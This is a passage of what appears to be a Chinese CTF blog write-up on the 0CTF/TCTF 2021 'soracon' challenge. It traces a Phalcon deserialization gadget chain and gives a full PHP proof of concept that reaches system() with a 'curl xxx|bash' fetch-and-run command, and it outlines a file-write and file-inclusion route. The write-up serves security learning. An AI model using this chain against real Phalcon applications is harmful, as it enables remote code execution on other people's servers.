class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还是用刚刚的node server。本地看下结果<br><img src="https://hackmd.summershrimp.com/uploads/upload_476c5f23bf8d5a1f57e5226c244d7287.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_476c5f23bf8d5a1f57e5226c244d7287.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>发现可以触发反序列化。到此为止，这道题的漏洞部分就已经分析完了。</p>
+<h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><p>然后就是如何在题目远程找到触发反序列化的问题了。然而自己一方面没看到题目给的phpinfo.php，另一方面没时间看题。。。所以当时直接放弃了。后来看题解的链子，感觉还是有些难度的。</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_e461a4f7132eca9369fd67455930a1e7.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_e461a4f7132eca9369fd67455930a1e7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>注意到扩展这里的phalcon, 我们可以找到源码cphalcon。会发现其源码都是.zep文件，应该是编译成c后作为扩展使用。但是整体风格跟php差不多。所以直接手动审就行了。</p>
+<p>入口是个抽象类AbstractAdapter<br><img src="https://hackmd.summershrimp.com/uploads/upload_6d090aad0104828e6c97325ff75a4015.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_6d090aad0104828e6c97325ff75a4015.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>后续根据<code>defaultFormatter</code>调用commit方法。这里可以找到实现这个抽象类的Stream类。作为我们payload实例化的对象。然后会发现最终调用过程中，会调用其process方法。<br><img src="https://hackmd.summershrimp.com/uploads/upload_5c9f06ad9e6ab4af289a3c9077e5ad65.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_5c9f06ad9e6ab4af289a3c9077e5ad65.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>所以如果能把message控住，这里就有个任意文件写。我们回到抽象类看下<code>getFornatedItem</code>发现会实例化一个Logger\Formatter下的类作为formater,调用其format方法。<br>以Json为例<br><img src="https://hackmd.summershrimp.com/uploads/upload_59c8eade8feea8088564477e2ee0214c.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_59c8eade8feea8088564477e2ee0214c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>做到了调用可控参数的<code>getTime()</code>方法。此时常见的一个思路就是全局找<code>__call</code>扩展利用链。</p>
+<p>这里后来看了下zsx的链跟Nu1L的链。其实都用了同一个<code>__call</code></p>
+<p>看到Di.zep</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(string! method, array arguments = [])</span> -&gt; <span class="title">var</span> | <span class="title">null</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> instance, possibleService, definition;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * If the magic method starts with "get" we try to get a service with</span></span><br><span class="line"><span class="comment">	 * that name</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> starts_with(method, <span class="string">"get"</span>) &#123;</span><br><span class="line">		let possibleService = lcfirst(substr(method, <span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">isset</span> this-&gt;services[possibleService] &#123;</span><br><span class="line">			let instance = this-&gt;get(possibleService, arguments);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> instance;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>这个使用挺常见的，一般常见于处理getter，setter型的方法。那么此处我们控制住<code>services</code>数组。就能调用其get方法。<br>get方法的核心在<br><img src="https://hackmd.summershrimp.com/uploads/upload_2e194cca7074bf82083c55fdae7462b8.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_2e194cca7074bf82083c55fdae7462b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>全局找会发现一个比较好用的resolve。即\Di下的Service类resolve方法。<br>resolve方法。我们首先注意到definition可控。如果是字符串的话，可以实例化类。</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_8ba8c7dd346dfdf9f1eabf731030cbd0.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_8ba8c7dd346dfdf9f1eabf731030cbd0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>如果是其他的话，会调用builder来build</p>
+<p>到这里我看了下，Nu1L跟zsx的链子就有差别了。<br><img src="https://hackmd.summershrimp.com/uploads/upload_b84d3cc07fea0eaf687fb9a3aff8d719.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_b84d3cc07fea0eaf687fb9a3aff8d719.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>Nu1L选择走上面， 可以做到实例化一个类且构造方法参数可控。然后后面代码都不执行直接返回了。</p>
+<p>zsx是单纯实例化一个类。然后继续走下面。</p>
+<p>build方法下面的关键代码就在：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> methodPosition, method in paramCalls &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The call parameter must be an array of arrays</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> unlikely typeof method != <span class="string">"array"</span> &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(</span><br><span class="line">			<span class="string">"Method call must be an array on position "</span> . methodPosition</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * A param 'method' is required</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> unlikely !fetch methodName, method[<span class="string">"method"</span>] &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(</span><br><span class="line">			<span class="string">"The method name is required on position "</span> . methodPosition</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Create the method call</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	let methodCall = [instance, methodName];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> fetch arguments, method[<span class="string">"arguments"</span>] &#123;</span><br><span class="line">		<span class="keyword">if</span> unlikely typeof arguments != <span class="string">"array"</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(</span><br><span class="line">				<span class="string">"Call arguments must be an array "</span> . methodPosition</span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> count(arguments) &#123;</span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * Call the method on the instance</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			call_user_func_array(</span><br><span class="line">				methodCall,</span><br><span class="line">				this-&gt;buildParameters(container, arguments)</span><br><span class="line">			);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * Go to next method call</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Call the method on the instance without arguments</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	call_user_func(methodCall);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们上面instance可控。这个代码块里<code>methodCall</code>,<code>this-&gt;buildParameters(container, arguments)</code>跟进看的话其实都是可控的。所以相当于是，我们可以执行一个<code>create_instance</code>实例化的类的任意方法，且参数可控。</p>
+<p>这里zsx的链子是，create_instance实例化一个Validation类。然后调用add方法设置好这个Validation的validator。然后注意到上面<code>for methodPosition, method in paramCalls</code>是循环调用的。也就是说，我们还能再调用同一个instance的另一个方法。此处即<code>validate</code>方法。</p>
+<p>这个方法妙在，上面实例化时，虽然类的参数没有设置为可控值。但是由于同一个instance循环调用这点，就可以先调用add方法设置好参数，再调用validate方法执行命令。<br>这里validator是用的Callback<br><img src="https://hackmd.summershrimp.com/uploads/upload_be8eb110d3cd2a72f7c688acff81611c.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_be8eb110d3cd2a72f7c688acff81611c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>callback完全可控。不过<br>这里zsx的参数是用\Phalcon\Acl\Component()控住的。其实是因为validate方法只接收数组或对象作参数。那么找一个<code>__toString</code>就行了。</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Phalcon</span>\<span class="title">Acl</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"curl xxx|bash"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Phalcon</span>\<span class="title">Validation</span>\<span class="title">Validator</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Callback</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options = [</span><br><span class="line">        <span class="string">"message"</span> =&gt; <span class="string">""</span>,</span><br><span class="line">        <span class="string">"callback"</span> =&gt; <span class="string">"system"</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Phalcon</span>\<span class="title">Di</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $definition;</span><br><span class="line">    <span class="keyword">public</span> $resolved = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> $shared = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> $sharedInstance = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $eventsManager = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($definition)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;definition = $definition;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Phalcon</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Di</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $services;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($services)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;services = $services;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Phalcon</span>\<span class="title">Logger</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractAdapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $defaultFormatter= <span class="string">"Json"</span>;</span><br><span class="line">    <span class="keyword">public</span> $formatter;</span><br><span class="line">    <span class="keyword">public</span> $inTransaction = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $queue;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stream</span> <span class="keyword">extends</span>  <span class="title">AbstractAdapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handler = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $mode = <span class="string">"ab"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"/tmp/byc"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queue)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;queue = $queue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = <span class="keyword">new</span> Stream([</span><br><span class="line">        <span class="keyword">new</span> \Phalcon\Di([</span><br><span class="line">            <span class="string">"context"</span>=&gt; <span class="keyword">new</span> \Phalcon\Di\Service([</span><br><span class="line">                <span class="string">"className"</span> =&gt; <span class="string">"Phalcon\Validation"</span>,</span><br><span class="line">                <span class="string">"arguments"</span> =&gt; [],</span><br><span class="line">                <span class="string">"calls"</span> =&gt; [</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">"method"</span> =&gt; <span class="string">"add"</span>,</span><br><span class="line">                        <span class="string">"arguments"</span> =&gt; [</span><br><span class="line">                            [</span><br><span class="line">                                <span class="string">"type"</span> =&gt; <span class="string">"parameter"</span>,</span><br><span class="line">                                <span class="string">"value"</span> =&gt; [<span class="string">""</span>]</span><br><span class="line">                            ],</span><br><span class="line">                            [</span><br><span class="line">                                <span class="string">"type"</span> =&gt; <span class="string">"parameter"</span>,</span><br><span class="line">                                <span class="string">"value"</span> =&gt; <span class="keyword">new</span> \Phalcon\Validation\Validator\Callback()</span><br><span class="line">                            ]</span><br><span class="line">                        ]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">"method"</span> =&gt; <span class="string">"validate"</span>,</span><br><span class="line">                        <span class="string">"arguments"</span> =&gt; [</span><br><span class="line">                            [</span><br><span class="line">                                <span class="string">"type"</span> =&gt; <span class="string">"parameter"</span>,</span><br><span class="line">                                <span class="string">"value"</span> =&gt; <span class="keyword">new</span> \Phalcon\Acl\Component()</span><br><span class="line">                            ]</span><br><span class="line">                        ]</span><br><span class="line">                    ]</span><br><span class="line">                ]</span><br><span class="line">            ])</span><br><span class="line">        ])</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">echo</span> (serialize($poc));</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_46e86d905e1b9caf5c30080e5f8bcf4a.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_46e86d905e1b9caf5c30080e5f8bcf4a.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>还有Nu1L的方法。整体上其实比较好想。因为前面已经有一个fwrite了。控制住参数就能任意写。然后如果有文件包含就能rce了。</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_5c0d0bc9fdf15317efe3eb48358adfb9.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_5c0d0bc9fdf15317efe3eb48358adfb9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这个类直接构造方法就能文件包含。所以到上面那步<code>create_instance</code>就可以包含了。</p>
+<p>写文件的话更简单。在format那不用触发<code>__call</code>。直接控制好里面各个方法参数就能直接fwrite。</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p> 比赛有时间肝这题的话，应该收获挺大的。。。<br> 其他题质量也非常不错，比如2个java。希望有机会能看到wuyx师傅跟ccl师傅放出完整题解~</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://www.bycsec.top/2021/07/07/0ctf-tctf-soracon/>https://www.bycsec.top/2021/07/07/0ctf-tctf-soracon/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+        <div class='donate'>
+          <div class='imgs'>
+            
+              <img src='/assests/wechat.png'>
+            
+          </div>
+        </div>
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-07-07T00:14:41+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jul 7, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/06/06/%E4%BD%BF%E7%94%A8Node-js%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E7%88%AC%E8%99%AB/'>
+          <p class='title'>使用Node.js实现动态爬虫<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>  本文是关于自己用Node.js实现动态爬虫的一些记录以及踩坑。
+
+
+起手式  第一个问题就是爬虫的语言选择。根据个人喜好以及之前写过的很多demo，编程语言以及模块毋庸置疑是选用当前最好的h...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#vuln"><span class="toc-text">vuln</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gadget"><span class="toc-text">gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="0ctf/tctf-soracon";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.remove("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="half";
+    cover_wrapper.style.display="";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+                
+              </a>
+            
+          
+            
+              <a href="mailto:baiyecha404@gmail.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+                
+              </a>
+            
+          
+            
+              <a href="https://github.com/baiyecha404"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+                
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        Use
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
+        as theme
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
